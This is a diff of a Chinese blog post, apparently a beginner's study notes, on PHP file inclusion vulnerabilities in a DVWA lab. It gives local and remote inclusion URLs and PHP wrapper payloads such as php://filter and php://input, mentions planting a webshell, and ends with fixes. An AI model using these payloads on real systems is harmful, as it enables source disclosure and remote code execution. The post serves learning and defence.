@@ -4,8 +4,10 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="分类: 学习笔记总结, Lifelong learning">
-    <meta name="description" content="笨鸟先飞">
+    <meta name="keywords" content="文件包含原理, Lifelong learning">
+    <meta name="description" content="文件包含原理include() include_once() require() require_once() include()和require()的区别：
+require()如果在包含过程中出错，就会直接退出，不执行后续语句
+inclu">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -17,7 +19,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>分类: 学习笔记总结 | Lifelong learning</title>
+    <title>文件包含原理 | Lifelong learning</title>
     <link rel="icon" type="image/png" href="/favicon.png">
     
 
@@ -333,252 +335,521 @@
 
 </header>
 
-    <div class="bg-cover pd-header about-cover">
-    <div class="container">
-    <div class="row">
-    <div class="col s10 offset-s1 m8 offset-m2 l8 offset-l2">
-        <div class="brand">
-            <div class="title center-align">
-                
-                ying
-                
-            </div>
+    
 
-            <div class="description center-align">
-                
-                <span id="subtitle"></span>
-                <script src="/libs/typed/typed.js"></script>
-                <script>
-                    var typed = new Typed("#subtitle", {
-                        strings: [ 
-                            
-                                "从来没有真正的绝境, 只有心灵的迷途",
-                            
-                                "Never really desperate, only the lost of the soul",
-                            
-                        ],
-                        startDelay: 300,
-                        typeSpeed: 100,
-                        loop: true,
-                        backSpeed: 50,
-                        showCursor: true
-                    });
-                </script>
-                
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/20.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">文件包含原理</h1>
+                </div>
             </div>
         </div>
     </div>
 </div>
 
+
+
+
+<main class="post-container content">
+
+    
+    <div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/">
+                                <span class="chip bg-color">漏洞原理分析</span>
+                            </a>
+                        
+                            <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/">
+                                <span class="chip bg-color">文件包含漏洞学习</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%80%BB%E7%BB%93/" class="post-category">
+                                学习笔记总结
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2023-02-03
+                </div>
+                
+
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    1.4k
+                </div>
+                
+
+                
+
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.min.css">
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h2 id="文件包含原理"><a href="#文件包含原理" class="headerlink" title="文件包含原理"></a>文件包含原理</h2><pre class="line-numbers language-none"><code class="language-none">include() include_once() require() require_once() include()和require()的区别：
+require()如果在包含过程中出错，就会直接退出，不执行后续语句
+include()如果在包含过程中出错，只会提出警告，但不影响后续语句的执行index.php?file=php://filter/read=convert.base64-encode/resource=xxx.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="0x01、什么是文件包含"><a href="#0x01、什么是文件包含" class="headerlink" title="0x01、什么是文件包含?**"></a>0x01、什么是文件包含?**</h3><p>为了更好地使用代码的重用性，引入了文件包含函数，通过文件包含函数将文件包含进来，直接使用包含文件的代码，简单点来说就是一个文件里面包含另外一个或多个文件。</p>
+<h3 id="0x02、漏洞成因"><a href="#0x02、漏洞成因" class="headerlink" title="0x02、漏洞成因**"></a>0x02、漏洞成因**</h3><p>文件包含函数加载的参数没有经过过滤或者严格的定义，可以被用户控制，包含其他恶意文件，导致了执行了非预期的代码。</p>
+<h3 id="0x03、php引发文件包含漏洞的四个函数"><a href="#0x03、php引发文件包含漏洞的四个函数" class="headerlink" title="0x03、php引发文件包含漏洞的四个函数**"></a>0x03、php引发文件包含漏洞的四个函数**</h3><ol>
+<li>include() ：使用此函数，只有代码执行到此函数时才将文件包含进来，发生错误时只警告并继续执行。</li>
+<li>inclue_once() ：功能和前者一样，区别在于当重复调用同一文件时，程序只调用一次。</li>
+<li>require()：使用此函数，只要程序执行，立即调用此函数包含文件，发生错误时，会输出错误信息并立即终止程序。</li>
+<li>require_once() ：功能和前者一样，区别在于当重复调用同一文件时，程序只调用一次。</li>
+</ol>
+<h3 id="0x04、文件包含漏洞分类"><a href="#0x04、文件包含漏洞分类" class="headerlink" title="0x04、文件包含漏洞分类"></a>0x04、文件包含漏洞分类</h3><p><strong>4.1、本地文件包含漏洞</strong><br>顾名思义，指的是能打开并包含本地文件的漏洞。大多数情况下遇到的文件包含漏洞都是本地文件包含漏洞。</p>
+<p><strong>示例4.1：</strong><br>以DVWA的靶场环境为例，靶场地址：<a target="_blank" rel="noopener" href="http://127.0.0.1/DVWA/vulnerabilities/fi/?page=file1.php">http://127.0.0.1/DVWA/vulnerabilities/fi/?page=file1.php</a></p>
+<p><img src="/images/dvwa.png" alt="dvwa"></p>
+<p>把DVWA Security的等级调到Low，在DVWA\vulnerabilities\fi\source\Low.php中有以下代码</p>
+<p>在DVWA\vulnerabilities\fi\source\index.php中Low.php又被包含在其中，这就构成了文件包含漏洞，而且被包含的文件还是我们可控的。</p>
+<p>在file1同级目录下新建一个名为test.txt的文本文件，内容如下：</p>
+<p>访问<a target="_blank" rel="noopener" href="http://127.0.0.1/DVWA/vulnerabilities/fi/?page=test.txt">http://127.0.0.1/DVWA/vulnerabilities/fi/?page=test.txt</a></p>
+<p><img src="/images/testphp.png" alt="test"></p>
+<p>文件包含可以包含任意文件，如图片，文本文件，压缩包等等，如果文件中有服务器能识别的脚本语言，就按照当前脚本语言执行，否则就直接显示出源代码。</p>
+<p><strong>4.2、远程文件包含漏洞</strong></p>
+<p>是指能够包含远程服务器上的文件并执行。由于远程服务器的文件是我们可控的，因此漏洞一旦存在，危害性会很大。</p>
+<p>但远程文件包含漏洞的利用条件较为苛刻，需要php.ini中配置<br>allow_url_fopen=On<br>allow_url_include=On</p>
+<p><strong>示例4.2：</strong><br>先打开目标服务器的php.ini文件进行以下相关设置，然后重启服务器</p>
+<p><img src="/images/phpini.png" alt="phpini"></p>
+<p>之后在本地新建文件test2.txt，文件内容为：<br>目标服务器ip：192.168.1.114<br>本机ip：192.168.1.106<br>访问<a target="_blank" rel="noopener" href="http://192.168.1.114/DVWA/vulnerabilities/fi/?page=http://192.168.1.106/test2.txt">http://192.168.1.114/DVWA/vulnerabilities/fi/?page=http://192.168.1.106/test2.txt</a></p>
+<p><img src="/images/test2.png" alt="test2"></p>
+<h3 id="0x05、文件包含漏洞之伪协议"><a href="#0x05、文件包含漏洞之伪协议" class="headerlink" title="0x05、文件包含漏洞之伪协议**"></a>0x05、文件包含漏洞之伪协议**</h3><p><strong>5.1、php://filter</strong><br>利用条件：<br>只是读取，所以只需要开启allow_url_fopen，对allow_url_include不做要求<br>用法：<br>通过指定末尾文件，可以读取经base64加密后的文件源码，虽然不能直接获取shell等，但能够读取敏感文件，危害还是是挺大的。</p>
+<p><strong>示例5.1：</strong><br><a target="_blank" rel="noopener" href="http://127.0.0.1/DVWA/vulnerabilities/fi/?page=php://filter/read=convert.base64-encode/resource=test.txt">http://127.0.0.1/DVWA/vulnerabilities/fi/?page=php://filter/read=convert.base64-encode/resource=test.txt</a></p>
+<p><img src="/images/base64encode.png" alt="base64"></p>
+<p><strong>5.2、php://input</strong><br>可以访问请求的原始数据的只读流, 将post请求中的数据作为PHP代码执行<br>利用条件：<br>需要开启allow_url_include=on，对allow_url_fopen不做要求<br>用法：?file=php://input 数据利用POST传过去。</p>
+<p><strong>示例5.2：</strong></p>
+<p><img src="/images/52.png"></p>
+<p>也可以写入木马</p>
+<p><img src="/images/muma.png" alt="muma"></p>
+<p>还可以命令执行</p>
+<p><img src="/images/zhixing.png"></p>
+<p><strong>5.3、zip://伪协议</strong><br>zip://可以访问压缩文件中的文件<br>条件： 使用zip协议，需要将#编码为%23，所以需要PHP 的版本&gt; =5.3.0，要是因为版本的问题无法将#编码成%23，可以手动把#改成%23。<br>用法：?file=zip://[压缩文件路径]#[压缩文件内的子文件名]</p>
+<p><strong>示例5.3：</strong><br>在本地新建一个文件test.php，并且压缩成test.zip压缩包</p>
+<p><img src="/images/testzip.png"></p>
+<p>要是把压缩包的后缀改为其他任意格式的文件也可以正常使用。</p>
+<p><strong>5.4、phar://伪协议</strong><br>与zip://协议类似，但用法不同，zip://伪协议中是用#把压缩文件路径和压缩文件的子文件名隔开，而phar://伪协议中是用/把压缩文件路径和压缩文件的子文件名隔开，即?file=phar://[压缩文件路径]/[压缩文件内的子文件名]</p>
+<p><strong>示例5.4：</strong></p>
+<p><img src="/images/test.png"></p>
+<p><strong>5.5、data:text/plain</strong><br>和php伪协议的input类似，也可以执行任意代码，但利用条件和用法不同<br>条件：allow_url_fopen参数与allow_url_include都需开启<br>用法1：?file=data:text/plain,<br>用法2：?file=data:text/plain;base64,编码后的php代码</p>
+<p><strong>示例5.5：</strong></p>
+<p><img src="/images/phpinfo.png"></p>
+<p><img src="/images/data.png"></p>
+<p>注：经base64编码后的加号和等号要手动的url编码，以免浏览器识别不了</p>
+<p><strong>5.6、file://伪协议</strong><br>file:// 用于访问本地文件系统，且不受allow_url_fopen与allow_url_include的影响。<br>用法：?file=file://文件绝对路径</p>
+<p><strong>示例5.6</strong></p>
+<p><img src="/images/56.png"></p>
+<h2 id="0x06、修复方案"><a href="#0x06、修复方案" class="headerlink" title="0x06、修复方案"></a>0x06、修复方案</h2><p>1、PHP 中使用 open_basedir 配置限制访问在指定的区域<br>2、过滤.（点）/（反斜杠）\（反斜杠）等特殊字符<br>3、尽量关闭allow_url_include配置</p>
+<h2 id="0x07、总结"><a href="#0x07、总结" class="headerlink" title="0x07、总结"></a>0x07、总结</h2><p>关于文件包含的内容，目前小白也就只能总结出这些了，总之收获不菲，感觉很有用。</p>
+<p><img src="/images/wenjianbaohan.png"></p>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">ying</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="http://hwying1.github.io/2023/02/03/wen-jian-bao-han-yuan-li/">http://hwying1.github.io/2023/02/03/wen-jian-bao-han-yuan-li/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">ying</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/">
+                                    <span class="chip bg-color">漏洞原理分析</span>
+                                </a>
+                            
+                                <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/">
+                                    <span class="chip bg-color">文件包含漏洞学习</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat.jpg" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
 
 <script>
-    // 每天切换 banner 图.  Switch banner image every day.
-    var bannerUrl = "/medias/banner/" + new Date().getDay() + '.jpg';
-    $('.bg-cover').css('background-image', 'url(' + bannerUrl + ')');
+    $(function () {
+        $('.tabs').tabs();
+    });
 </script>
 
-
+            
+        </div>
     </div>
-</div>
-
-<main class="content">
 
     
 
-<div id="category-cloud" class="container chip-container">
-    <div class="card">
-        <div class="card-content">
-            <div class="tag-title center-align">
-                <i class="fas fa-bookmark"></i>&nbsp;&nbsp;文章分类
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
             </div>
-            <div class="tag-chips">
-                
-                
-                
-                <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="漏洞复现: 1">
-                    <span class="chip center-align waves-effect waves-light
-                             chip-default "
-                            style="background-color: #F9EBEA;">漏洞复现
-                        <span class="tag-length">1</span>
-                    </span>
+            <div class="card">
+                <a href="/2023/02/03/wen-jian-bao-han-yuan-li/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/20.jpg" class="responsive-img" alt="文件包含原理">
+                        
+                        <span class="card-title">文件包含原理</span>
+                    </div>
                 </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-02-03
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%80%BB%E7%BB%93/" class="post-category">
+                                    学习笔记总结
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+
                 
-                
-                <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%80%BB%E7%BB%93/" title="学习笔记总结: 3">
-                    <span class="chip center-align waves-effect waves-light
-                             chip-active "
-                            style="background-color: #F5EEF8;">学习笔记总结
-                        <span class="tag-length">3</span>
-                    </span>
-                </a>
-                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/">
+                        <span class="chip bg-color">漏洞原理分析</span>
+                    </a>
+                    
+                    <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/">
+                        <span class="chip bg-color">文件包含漏洞学习</span>
+                    </a>
+                    
+                </div>
                 
             </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2023/02/03/xss-xue-xi-bi-ji/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/18.jpg" class="responsive-img" alt="xss学习笔记">
+                        
+                        <span class="card-title">xss学习笔记</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-02-03
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%80%BB%E7%BB%93/" class="post-category">
+                                    学习笔记总结
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/xss%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/">
+                        <span class="chip bg-color">xss漏洞学习</span>
+                    </a>
+                    
+                    <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/">
+                        <span class="chip bg-color">漏洞原理分析</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+
+  <!-- 是否加载使用自带的 prismjs. -->
+  <script type="text/javascript" src="/libs/prism/prism.min.js"></script>
+
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
         </div>
     </div>
 </div>
 
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
 
     
 
-    <article id="articles" class="container articles">
-        <div class="row tags-posts">
-            
-            <div class="article tag-post col s12 m6 l4" data-aos="zoom-in">
-                <div class="card">
-                    <a href="/2023/02/03/wen-jian-bao-han-yuan-li/">
-                        <div class="card-image tag-image">
-                            
-                            
-                            <img src="/medias/featureimages/20.jpg" class="responsive-img" alt="文件包含原理">
-                            
-                            <span class="card-title">文件包含原理</span>
-                        </div>
-                    </a>
-                    <div class="card-content article-content">
-                        <div class="summary block-with-text">
-                            
-                                文件包含原理include() include_once() require() require_once() include()和require()的区别：
-require()如果在包含过程中出错，就会直接退出，不执行后续语句
-inclu
-                            
-                        </div>
-                        <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2023-02-03
-                            </span>
-                            <span class="publish-author">
-                                
-                                <i class="fas fa-bookmark fa-fw icon-category"></i>
-                                
-                                <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%80%BB%E7%BB%93/" class="post-category">
-                                    学习笔记总结
-                                </a>
-                                
-                                
-                            </span>
-                        </div>
-                    </div>
-
-                    
-                    <div class="card-action article-tags">
-                        
-                        <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/">
-                            <span class="chip bg-color">漏洞原理分析</span>
-                        </a>
-                        
-                        <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/">
-                            <span class="chip bg-color">文件包含漏洞学习</span>
-                        </a>
-                        
-                    </div>
-                    
-                </div>
-            </div>
-            
-            <div class="article tag-post col s12 m6 l4" data-aos="zoom-in">
-                <div class="card">
-                    <a href="/2023/02/03/xss-xue-xi-bi-ji/">
-                        <div class="card-image tag-image">
-                            
-                            
-                            <img src="/medias/featureimages/18.jpg" class="responsive-img" alt="xss学习笔记">
-                            
-                            <span class="card-title">xss学习笔记</span>
-                        </div>
-                    </a>
-                    <div class="card-content article-content">
-                        <div class="summary block-with-text">
-                            
-                                00×1 什么是XSS漏洞：XSS又叫CSS (Cross Site Script) ，跨站脚本攻击。它指的是恶意攻击者往Web页面里插入恶意html代码，当用户浏览该页之时，嵌入其中Web里面的html代码会被执行，从而达到恶意攻击用户的
-                            
-                        </div>
-                        <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2023-02-03
-                            </span>
-                            <span class="publish-author">
-                                
-                                <i class="fas fa-bookmark fa-fw icon-category"></i>
-                                
-                                <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%80%BB%E7%BB%93/" class="post-category">
-                                    学习笔记总结
-                                </a>
-                                
-                                
-                            </span>
-                        </div>
-                    </div>
-
-                    
-                    <div class="card-action article-tags">
-                        
-                        <a href="/tags/xss%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/">
-                            <span class="chip bg-color">xss漏洞学习</span>
-                        </a>
-                        
-                        <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/">
-                            <span class="chip bg-color">漏洞原理分析</span>
-                        </a>
-                        
-                    </div>
-                    
-                </div>
-            </div>
-            
-            <div class="article tag-post col s12 m6 l4" data-aos="zoom-in">
-                <div class="card">
-                    <a href="/2023/02/03/xxe-xue-xi-bi-ji/">
-                        <div class="card-image tag-image">
-                            
-                            
-                            <img src="/medias/featureimages/21.jpg" class="responsive-img" alt="xxe学习笔记">
-                            
-                            <span class="card-title">xxe学习笔记</span>
-                        </div>
-                    </a>
-                    <div class="card-content article-content">
-                        <div class="summary block-with-text">
-                            
-                                0x00  什么是xml1.定义XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。
-2.文档结
-                            
-                        </div>
-                        <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2023-02-03
-                            </span>
-                            <span class="publish-author">
-                                
-                                <i class="fas fa-bookmark fa-fw icon-category"></i>
-                                
-                                <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%80%BB%E7%BB%93/" class="post-category">
-                                    学习笔记总结
-                                </a>
-                                
-                                
-                            </span>
-                        </div>
-                    </div>
-
-                    
-                    <div class="card-action article-tags">
-                        
-                        <a href="/tags/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/">
-                            <span class="chip bg-color">xxe漏洞学习</span>
-                        </a>
-                        
-                        <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/">
-                            <span class="chip bg-color">漏洞原理解析</span>
-                        </a>
-                        
-                    </div>
-                    
-                </div>
-            </div>
-            
-        </div>
-    </article>
 </main>
 
 
